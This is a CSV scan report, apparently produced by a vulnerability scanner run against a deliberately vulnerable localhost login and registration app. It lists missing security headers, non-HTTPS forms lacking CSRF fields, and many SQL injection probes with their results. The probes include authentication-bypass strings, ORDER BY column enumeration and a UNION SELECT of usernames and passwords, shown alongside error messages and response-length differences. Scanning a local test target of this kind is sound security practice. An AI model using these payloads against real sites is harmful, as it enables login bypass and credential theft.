target,type,detail
http://localhost/testwebsite/vulnauth/login.php,server,Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.0.30
http://localhost/testwebsite/vulnauth/login.php,header_issue,Server header exposes version info: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.0.30
http://localhost/testwebsite/vulnauth/login.php,header_issue,Missing security header: X-Frame-Options
http://localhost/testwebsite/vulnauth/login.php,header_issue,Missing security header: Content-Security-Policy
http://localhost/testwebsite/vulnauth/login.php,header_issue,Missing security header: X-Content-Type-Options
http://localhost/testwebsite/vulnauth/login.php,header_issue,Missing security header: Strict-Transport-Security
http://localhost/testwebsite/vulnauth/login.php,form_issue,Form action not HTTPS @ http://localhost/testwebsite/vulnauth/login.php
http://localhost/testwebsite/vulnauth/login.php,form_issue,No CSRF-like field (heuristic) @ http://localhost/testwebsite/vulnauth/login.php
http://localhost/testwebsite/vulnauth/login.php,form_issue,Form action not HTTPS @ http://localhost/testwebsite/vulnauth/register.php
http://localhost/testwebsite/vulnauth/login.php,form_issue,No CSRF-like field (heuristic) @ http://localhost/testwebsite/vulnauth/register.php
http://localhost/testwebsite/vulnauth/login.php,form_issue,Form action not HTTPS @ http://localhost/testwebsite/vulnauth/welcome.php
http://localhost/testwebsite/vulnauth/login.php,form_issue,No CSRF-like field (heuristic) @ http://localhost/testwebsite/vulnauth/welcome.php
http://localhost/testwebsite/vulnauth/login.php,form_issue,Form action not HTTPS @ http://localhost/testwebsite/vulnauth/welcome.php
http://localhost/testwebsite/vulnauth/login.php,form_issue,No CSRF-like field (heuristic) @ http://localhost/testwebsite/vulnauth/welcome.php
http://localhost/testwebsite/vulnauth/login.php,form_issue,Form action not HTTPS @ http://localhost/testwebsite/vulnauth/welcome.php
http://localhost/testwebsite/vulnauth/login.php,form_issue,No CSRF-like field (heuristic) @ http://localhost/testwebsite/vulnauth/welcome.php
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/login.php"", ""type"": ""post_sql_error"", ""payload"": ""\\"", ""pattern"": ""you have an error in your sql syntax"", ""evidence_snippet"": ""on: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that ""}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/login.php"", ""type"": ""post_sql_error"", ""payload"": ""\\"", ""pattern"": ""sqlstate"", ""evidence_snippet"": ""&lt;br /&gt; &lt;b&gt;Fatal error&lt;/b&gt;:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an e""}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/login.php"", ""type"": ""post_sql_dom_diff"", ""payload"": ""\\"", ""score"": 0.0}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/login.php"", ""type"": ""post_sql_error"", ""payload"": ""')--"", ""pattern"": ""you have an error in your sql syntax"", ""evidence_snippet"": ""on: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that ""}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/login.php"", ""type"": ""post_sql_error"", ""payload"": ""')--"", ""pattern"": ""sqlstate"", ""evidence_snippet"": ""&lt;br /&gt; &lt;b&gt;Fatal error&lt;/b&gt;:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an e""}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/login.php"", ""type"": ""post_sql_dom_diff"", ""payload"": ""')--"", ""score"": 0.0}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/login.php"", ""type"": ""post_sql_length_diff"", ""payload"": ""' OR '1'='1"", ""len"": 81659, ""baseline"": 358}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/login.php"", ""type"": ""post_sql_dom_diff"", ""payload"": ""' OR '1'='1"", ""score"": 0.2222222222222222}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/login.php"", ""type"": ""post_sql_length_diff"", ""payload"": ""' OR 1=1--"", ""len"": 81546, ""baseline"": 358}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/login.php"", ""type"": ""post_sql_dom_diff"", ""payload"": ""' OR 1=1--"", ""score"": 0.2222222222222222}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/login.php"", ""type"": ""post_sql_error"", ""payload"": ""')) OR 1=1--"", ""pattern"": ""you have an error in your sql syntax"", ""evidence_snippet"": ""on: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that ""}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/login.php"", ""type"": ""post_sql_error"", ""payload"": ""')) OR 1=1--"", ""pattern"": ""sqlstate"", ""evidence_snippet"": ""&lt;br /&gt; &lt;b&gt;Fatal error&lt;/b&gt;:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an e""}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/login.php"", ""type"": ""post_sql_dom_diff"", ""payload"": ""')) OR 1=1--"", ""score"": 0.0}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/login.php"", ""type"": ""post_sql_error"", ""payload"": ""admin' --"", ""pattern"": ""you have an error in your sql syntax"", ""evidence_snippet"": ""on: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that ""}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/login.php"", ""type"": ""post_sql_error"", ""payload"": ""admin' --"", ""pattern"": ""sqlstate"", ""evidence_snippet"": ""&lt;br /&gt; &lt;b&gt;Fatal error&lt;/b&gt;:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an e""}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/login.php"", ""type"": ""post_sql_dom_diff"", ""payload"": ""admin' --"", ""score"": 0.0}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/login.php"", ""type"": ""post_sql_error"", ""payload"": ""admin'/*"", ""pattern"": ""you have an error in your sql syntax"", ""evidence_snippet"": ""on: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that ""}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/login.php"", ""type"": ""post_sql_error"", ""payload"": ""admin'/*"", ""pattern"": ""sqlstate"", ""evidence_snippet"": ""&lt;br /&gt; &lt;b&gt;Fatal error&lt;/b&gt;:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an e""}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/login.php"", ""type"": ""post_sql_dom_diff"", ""payload"": ""admin'/*"", ""score"": 0.0}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/login.php"", ""type"": ""post_sql_error"", ""payload"": ""1' ORDER BY 1--"", ""pattern"": ""you have an error in your sql syntax"", ""evidence_snippet"": ""on: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that ""}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/login.php"", ""type"": ""post_sql_error"", ""payload"": ""1' ORDER BY 1--"", ""pattern"": ""sqlstate"", ""evidence_snippet"": ""&lt;br /&gt; &lt;b&gt;Fatal error&lt;/b&gt;:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an e""}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/login.php"", ""type"": ""post_sql_dom_diff"", ""payload"": ""1' ORDER BY 1--"", ""score"": 0.0}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/login.php"", ""type"": ""post_sql_error"", ""payload"": ""1' ORDER BY 2--"", ""pattern"": ""you have an error in your sql syntax"", ""evidence_snippet"": ""on: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that ""}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/login.php"", ""type"": ""post_sql_error"", ""payload"": ""1' ORDER BY 2--"", ""pattern"": ""sqlstate"", ""evidence_snippet"": ""&lt;br /&gt; &lt;b&gt;Fatal error&lt;/b&gt;:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an e""}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/login.php"", ""type"": ""post_sql_dom_diff"", ""payload"": ""1' ORDER BY 2--"", ""score"": 0.0}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/login.php"", ""type"": ""post_sql_error"", ""payload"": ""1' ORDER BY 3--"", ""pattern"": ""you have an error in your sql syntax"", ""evidence_snippet"": ""on: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that ""}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/login.php"", ""type"": ""post_sql_error"", ""payload"": ""1' ORDER BY 3--"", ""pattern"": ""sqlstate"", ""evidence_snippet"": ""&lt;br /&gt; &lt;b&gt;Fatal error&lt;/b&gt;:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an e""}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/login.php"", ""type"": ""post_sql_dom_diff"", ""payload"": ""1' ORDER BY 3--"", ""score"": 0.0}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/login.php"", ""type"": ""post_sql_length_diff"", ""payload"": ""-1' UNION SELECT 1,2,3--"", ""len"": 81668, ""baseline"": 358}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/login.php"", ""type"": ""post_sql_dom_diff"", ""payload"": ""-1' UNION SELECT 1,2,3--"", ""score"": 0.2222222222222222}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/login.php"", ""type"": ""post_sql_error"", ""payload"": ""' UNION SELECT NULL--"", ""pattern"": ""sqlstate"", ""evidence_snippet"": ""&lt;br /&gt; &lt;b&gt;Fatal error&lt;/b&gt;:  Uncaught PDOException: SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statemen""}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/login.php"", ""type"": ""post_sql_dom_diff"", ""payload"": ""' UNION SELECT NULL--"", ""score"": 0.0}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/login.php"", ""type"": ""post_sql_error"", ""payload"": ""' UNION SELECT username, password FROM users--"", ""pattern"": ""you have an error in your sql syntax"", ""evidence_snippet"": ""on: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that ""}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/login.php"", ""type"": ""post_sql_error"", ""payload"": ""' UNION SELECT username, password FROM users--"", ""pattern"": ""sqlstate"", ""evidence_snippet"": ""&lt;br /&gt; &lt;b&gt;Fatal error&lt;/b&gt;:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an e""}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/login.php"", ""type"": ""post_sql_length_diff"", ""payload"": ""' UNION SELECT username, password FROM users--"", ""len"": 578, ""baseline"": 358}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/login.php"", ""type"": ""post_sql_dom_diff"", ""payload"": ""' UNION SELECT username, password FROM users--"", ""score"": 0.0}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/login.php"", ""type"": ""post_sql_length_diff"", ""payload"": ""1' OR 'a'='a"", ""len"": 81667, ""baseline"": 358}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/login.php"", ""type"": ""post_sql_dom_diff"", ""payload"": ""1' OR 'a'='a"", ""score"": 0.2222222222222222}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/register.php"", ""type"": ""post_sql_error"", ""payload"": ""'"", ""pattern"": ""sqlstate"", ""evidence_snippet"": ""&lt;br /&gt; &lt;b&gt;Fatal error&lt;/b&gt;:  Uncaught PDOException: SQLSTATE[21S01]: Insert value list does not match column list: 1136 C""}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/register.php"", ""type"": ""post_sql_dom_diff"", ""payload"": ""'"", ""score"": 0.0}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/register.php"", ""type"": ""post_sql_error"", ""payload"": ""\\"", ""pattern"": ""you have an error in your sql syntax"", ""evidence_snippet"": ""on: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that ""}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/register.php"", ""type"": ""post_sql_error"", ""payload"": ""\\"", ""pattern"": ""sqlstate"", ""evidence_snippet"": ""&lt;br /&gt; &lt;b&gt;Fatal error&lt;/b&gt;:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an e""}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/register.php"", ""type"": ""post_sql_dom_diff"", ""payload"": ""\\"", ""score"": 0.0}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/register.php"", ""type"": ""post_sql_error"", ""payload"": ""\\'"", ""pattern"": ""sqlstate"", ""evidence_snippet"": ""&lt;br /&gt; &lt;b&gt;Fatal error&lt;/b&gt;:  Uncaught PDOException: SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry""}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/register.php"", ""type"": ""post_sql_dom_diff"", ""payload"": ""\\'"", ""score"": 0.0}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/register.php"", ""type"": ""post_sql_error"", ""payload"": ""')--"", ""pattern"": ""you have an error in your sql syntax"", ""evidence_snippet"": ""on: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that ""}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/register.php"", ""type"": ""post_sql_error"", ""payload"": ""')--"", ""pattern"": ""sqlstate"", ""evidence_snippet"": ""&lt;br /&gt; &lt;b&gt;Fatal error&lt;/b&gt;:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an e""}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/register.php"", ""type"": ""post_sql_length_diff"", ""payload"": ""')--"", ""len"": 534, ""baseline"": 329}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/register.php"", ""type"": ""post_sql_dom_diff"", ""payload"": ""')--"", ""score"": 0.0}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/register.php"", ""type"": ""post_sql_error"", ""payload"": ""' OR 1=1--"", ""pattern"": ""sqlstate"", ""evidence_snippet"": ""&lt;br /&gt; &lt;b&gt;Fatal error&lt;/b&gt;:  Uncaught PDOException: SQLSTATE[21S01]: Insert value list does not match column list: 1136 C""}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/register.php"", ""type"": ""post_sql_dom_diff"", ""payload"": ""' OR 1=1--"", ""score"": 0.0}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/register.php"", ""type"": ""post_sql_error"", ""payload"": ""')) OR 1=1--"", ""pattern"": ""you have an error in your sql syntax"", ""evidence_snippet"": ""on: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that ""}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/register.php"", ""type"": ""post_sql_error"", ""payload"": ""')) OR 1=1--"", ""pattern"": ""sqlstate"", ""evidence_snippet"": ""&lt;br /&gt; &lt;b&gt;Fatal error&lt;/b&gt;:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an e""}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/register.php"", ""type"": ""post_sql_length_diff"", ""payload"": ""')) OR 1=1--"", ""len"": 550, ""baseline"": 329}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/register.php"", ""type"": ""post_sql_dom_diff"", ""payload"": ""')) OR 1=1--"", ""score"": 0.0}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/register.php"", ""type"": ""post_sql_error"", ""payload"": ""admin' --"", ""pattern"": ""you have an error in your sql syntax"", ""evidence_snippet"": ""on: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that ""}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/register.php"", ""type"": ""post_sql_error"", ""payload"": ""admin' --"", ""pattern"": ""sqlstate"", ""evidence_snippet"": ""&lt;br /&gt; &lt;b&gt;Fatal error&lt;/b&gt;:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an e""}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/register.php"", ""type"": ""post_sql_length_diff"", ""payload"": ""admin' --"", ""len"": 533, ""baseline"": 329}"
